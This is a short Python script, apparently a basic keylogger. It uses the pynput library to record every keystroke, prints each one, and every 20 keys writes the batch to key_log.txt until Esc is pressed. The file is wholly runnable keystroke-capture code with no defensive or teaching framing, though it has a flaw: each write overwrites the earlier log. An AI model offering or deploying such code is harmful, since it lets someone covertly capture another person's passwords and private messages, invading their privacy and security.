#Install pynput for monitoring keyboard: pip install pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []
my_bool = False

# print the key strokes to the log file
def on_press(key):
  global keys, count

  keys.append(key)
  count += 1
  print("{0} pressed".format(key))

  if count >= 20:
    count = 0
    write_file(keys)
    keys = []

def write_file(key):
  with open("key_log.txt", "w") as f:
    for key in keys:
      f.write(str(key))

def on_release(key):
  if key==Key.esc:
    return my_bool 

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 
